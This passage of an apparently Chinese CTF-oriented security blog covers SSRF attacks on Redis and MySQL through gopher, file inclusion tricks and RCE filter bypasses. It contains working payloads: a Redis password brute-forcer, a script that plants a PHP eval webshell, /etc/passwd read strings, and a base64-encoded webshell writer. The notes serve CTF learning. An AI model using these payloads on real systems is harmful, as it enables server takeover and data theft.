⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  <br></code></pre></td></tr></table></figure><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>data = <span class="hljs-string">&quot;www.target.com&quot;</span>;<br>alist = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), <span class="hljs-number">2</span>):<br>alist.append((x[i:i+<span class="hljs-number">2</span>]).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://%&quot;</span>+<span class="hljs-string">&#x27;%&#x27;</span>.join(alist))<br></code></pre></td></tr></table></figure><h3 id="短网址"><a href="#短网址" class="headerlink" title="短网址"></a>短网址</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.985.so/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.urlc.cn/  </span><br></code></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>在vps上部署</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.10&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="六、SSRF漏洞点挖掘"><a href="#六、SSRF漏洞点挖掘" class="headerlink" title="六、SSRF漏洞点挖掘"></a>六、SSRF漏洞点挖掘</h2><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><p>关键字：Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</p><h2 id="七、漏洞利用复现"><a href="#七、漏洞利用复现" class="headerlink" title="七、漏洞利用复现"></a>七、漏洞利用复现</h2><h3 id="ssrf打redis"><a href="#ssrf打redis" class="headerlink" title="ssrf打redis"></a>ssrf打redis</h3><p>主要方法：</p><ol><li>爆破密码</li><li>写shell</li><li>写入ssh公钥</li><li>定时任务反弹shell</li><li>主从复制</li></ol><p>参考<a href="https://www.cnblogs.com/wjrblogs/p/14456190.html">https://www.cnblogs.com/wjrblogs/p/14456190.html</a></p><p>环境：CTFHUB-SSRF-Redis协议</p><p>漏洞点：<code>/?url=</code></p><p><img src="/../img/SSRF_img/clip_image002.gif" alt="img"></p><p>xxxxxxxxxx npiet.exe -tpic download.png Python</p><p><img src="/../img/SSRF_img/clip_image004.gif" alt="img"></p><p>尝试用gopher爆破密码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://challenge-f6443f96c8918df3.sandbox.ctfhub.com:10800/?url=&quot;</span>  <span class="hljs-comment">#目标url</span><br>rhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span>   <br>rport = <span class="hljs-string">&quot;6379&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwd.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    passwds = file.readlines()<br>    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:<br>        passwd = passwd.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        len_pass = <span class="hljs-built_in">len</span>(passwd)<br>        payload = <span class="hljs-string">r&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r&quot;%250d%250a&quot;</span>+passwd+<span class="hljs-string">r&quot;%250D%250A%252A1%250D%250A&quot;</span><br>        url = target+<span class="hljs-built_in">str</span>(payload)<br>        text = requests.get(url).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)<br>            <span class="hljs-built_in">print</span>(text + payload)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>无果，写shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># 使用的协议 </span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># 目标redis的端口号 </span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php @eval($_POST[&#x27;xxx&#x27;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shell的名字 </span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span>      <span class="hljs-comment"># 写入的路径</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment"># 如果有密码 则填入</span><br><span class="hljs-comment"># 恶意命令 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += parse.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;二次url编码后的结果:\n&quot;</span> ,parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成gopher写shell的payload</p><p><img src="/../img/SSRF_img/clip_image006.gif" alt="img"></p><p>写马，执行，成功</p><p><img src="/../img/SSRF_img/clip_image008.gif" alt="img"></p><p>无法写入ssh公钥，原因：redis是www-data权限，写不进&#x2F;root</p><p>无法写入定时计划反弹shell，原因：没有crontab命令</p><h3 id="ssrf打mysql"><a href="#ssrf打mysql" class="headerlink" title="ssrf打mysql"></a>ssrf打mysql</h3><p>参考</p><p><a href="https://www.sqlsec.com/2021/12/bytectf2021.html">https://www.sqlsec.com/2021/12/bytectf2021.html</a></p><p><a href="https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/">https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/</a></p><p>ssrf dict探测到有3306。利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>生成payload探测mysql有无密码</p><p>注意Gopherus无法直接生成udf的payload（会截断），需要改一下代码</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含与RCE</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含与RCE"><a href="#文件包含与RCE" class="headerlink" title="文件包含与RCE"></a>文件包含与RCE</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PHP：<span class="hljs-built_in">include</span>()，<span class="hljs-built_in">include_once</span>()，<span class="hljs-built_in">require</span>()，<span class="hljs-built_in">require_once</span>()，<span class="hljs-built_in">fopen</span>()，<span class="hljs-built_in">readfile</span>() 等<br>JSP Servlet：ava<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>()，java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>() 等<br>ASP：includefile，includevirtual 等<br></code></pre></td></tr></table></figure><p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件是什么类型。</p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><h4 id="1-00-截断"><a href="#1-00-截断" class="headerlink" title="[1]%00 截断"></a>[1]%00 截断</h4><p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。 <code>?file=../../../../../../../../../etc/passwd%00</code></p><h4 id="2-路径长度截断"><a href="#2-路径长度截断" class="headerlink" title="[2]路径长度截断"></a>[2]路径长度截断</h4><p>Linux 需要文件名长于 4096，Windows 需要长于 256。 <code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></p><h4 id="3-点号截断"><a href="#3-点号截断" class="headerlink" title="[3]点号截断"></a>[3]点号截断</h4><p>只适用 Windows，点号需要长于 256。 <code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>条件<br><code>allow_url_include = on</code></p><p>实质上和LFI一样，只是能够包含远程的文件</p><p>用得比较多的协议有<code>php://input</code></p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的就可以执行命令命令<br>遇到<code>file_get_contents()</code>要联想到<code>php://input</code>绕过</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>);        <span class="hljs-comment">#文件读取</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);   <span class="hljs-comment">#文件写入</span><br><span class="hljs-meta">?&gt;</span><br><br>payload:<br><br>?file1=php:<span class="hljs-comment">//filter/resource=flag.php                             #明文读取</span><br>?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php  #编码读取</span><br> <br>?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=test                             #明文写入</span><br>?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=test #编码写入</span><br></code></pre></td></tr></table></figure><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code> </p><p>常见编码有两种方式：<code>base64</code>&#x2F;rot-13编码，两种过滤器分别为： <code>base64：convert.base64-encode</code> <code>rot-13：string.rot13</code><br>扩展（绕过方式）：<br><a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a><br><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=On</code> </p><p>类似php:&#x2F;&#x2F;input，用户控制输入流<br><code>data://text/plain;base64,Y2F0IC9mbGFn</code><br><code>data:text/plain;base64,Y2F0IC9mbGFn</code></p><h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>zip:&#x2F;&#x2F;可以访问压缩包里面的文件，当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行，从而实现任意代码执⾏。只需要是zip的压缩即可，后缀名可以任意更改<br><code>zip:///tmp/file.zip%23flag.txt</code></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>利用条件：<br> <code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，与zip协议有些相似</p><h4 id="netdoc"><a href="#netdoc" class="headerlink" title="netdoc:&#x2F;&#x2F;"></a>netdoc:&#x2F;&#x2F;</h4><p>在java中可以利用netdoc协议读取文件，可以简单认为部分代替了file协议，多用于ssrf</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE英文全称：remote command&#x2F;code execute（远程命令&#x2F;代码执行漏洞） 漏洞出现的原因：没有在输入口做输入处理。 我们常见的路由器、防火墙、入侵检测等设备的web管理界面上可能会提供给用户一个命令操作的web界面&#x2F;接口，如果此接口未做过滤&#x2F;有漏洞，攻击者有可能直接向服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p><h3 id="危险函数："><a href="#危险函数：" class="headerlink" title="危险函数："></a>危险函数：</h3><p>php：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>exec()</code><br>asp：<code>eval()</code><br>perl：<code>exec</code>、<code>system</code>、<code>qx//</code><br>python：<code>os.system()</code><br>go：<code>exec.Command()</code></p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Bash">more:        一页一页的显示档案内容<br>less:        与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:        从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:        查看尾几行<br><span class="hljs-built_in">nl</span>:                显示内容，顺便输出行号<br><span class="hljs-built_in">od</span>:                以二进制的方式读取档案内容<br>vi:                一种编辑器，这个也可以查看<br>vim:        一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:        文件排序并输出也可以查看内容<br><span class="hljs-built_in">uniq</span>:        可以查看 file -f:报错出具体内容 grep<br>strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br><span class="hljs-built_in">paste</span>        把每个文件以列对列的方式，一列列地加以合并<br>grep        grep &#123; flag.php打印有”&#123;“的一行<br>sed                一种编辑器，可以用sed -f flag.php读取flag<br>rev          读取倒叙的文件内容<br></code></pre></td></tr></table></figure><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>使用<code>/**/</code>、<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20</code>、<code>%09</code>、<code>$IFS$9</code>、<code>$&#123;IFS&#125;</code>、<code>IFS</code>、<code>$IFS$1</code>等</p><h4 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符 &#x2F;"></a>过滤分隔符 &#x2F;</h4><p>利用<code>;</code>执行多条命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cd</span> xx;<span class="hljs-built_in">ls</span> -al</span><br></code></pre></td></tr></table></figure><h4 id="过滤运算符-和"><a href="#过滤运算符-和" class="headerlink" title="过滤运算符|和&amp;"></a>过滤运算符|和&amp;</h4><p>使用<code>;</code>或 <code>%0a</code></p><h4 id="过滤flag、php等字符"><a href="#过滤flag、php等字符" class="headerlink" title="过滤flag、php等字符"></a>过滤flag、php等字符</h4><h5 id="拼接字符串绕过"><a href="#拼接字符串绕过" class="headerlink" title="拼接字符串绕过"></a>拼接字符串绕过</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=m=p%0an=hp%0acat$&#123;IFS&#125;flag.$m$n<br></code></pre></td></tr></table></figure><h5 id="ls-i"><a href="#ls-i" class="headerlink" title="ls -i"></a>ls -i</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -i + <span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure><p>组合拳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">ls</span> -i   <span class="hljs-comment">#找出文件pid</span><br><span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`   <span class="hljs-comment">#find / -inum id返回此id对应的文件名（路径）</span><br></code></pre></td></tr></table></figure><h5 id="输出到另一个文件"><a href="#输出到另一个文件" class="headerlink" title="输出到另一个文件"></a>输出到另一个文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">printf</span> /fla &gt; /tmp/hello %26%26 <span class="hljs-built_in">printf</span> g &gt;&gt; /tmp/hello %26%26 <span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello`<br><span class="hljs-comment">#printf /fla &gt; /tmp/hello ----&gt; 将 /fla 写入/tmp/hello文件</span><br><span class="hljs-comment">#printf g &gt;&gt; /tmp/hello ----&gt; 将 g 追加写入/tmp/hello文件。目前/tmp/hello文件中的内容就是：/flag</span><br><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello` ----&gt; `<span class="hljs-built_in">cat</span> /tmp/hello` 会输入出 /flag，<span class="hljs-built_in">cat</span> 会读取 /flag ，即可得到flag。<br></code></pre></td></tr></table></figure><h5 id="编码绕过-写入文件"><a href="#编码绕过-写入文件" class="headerlink" title="编码绕过(写入文件)"></a>编码绕过(写入文件)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | <span class="hljs-built_in">base64</span> -d 1.php<br></code></pre></td></tr></table></figure><h5 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t fl<span class="hljs-string">&#x27;&#x27;</span>ag 或ca<span class="hljs-string">&quot;&quot;</span>t fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure><h5 id="shell变量绕过"><a href="#shell变量绕过" class="headerlink" title="shell变量绕过"></a>shell变量绕过</h5><p> <code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p><h5 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t f\lag<br></code></pre></td></tr></table></figure><h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f*<br><span class="hljs-built_in">cat</span> fla?<br></code></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号{}</h5><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 <code>&#123;cat,flag&#125;</code></p><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><p>相当于cat目录下所有文件</p><h5 id="非法变量"><a href="#非法变量" class="headerlink" title="非法变量"></a>非法变量</h5><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a_b.&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p><p>传参 <code>?a[b.=system(&quot;ls&quot;);</code></p><h5 id="一些组合拳payload"><a href="#一些组合拳payload" class="headerlink" title="一些组合拳payload"></a>一些组合拳payload</h5><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 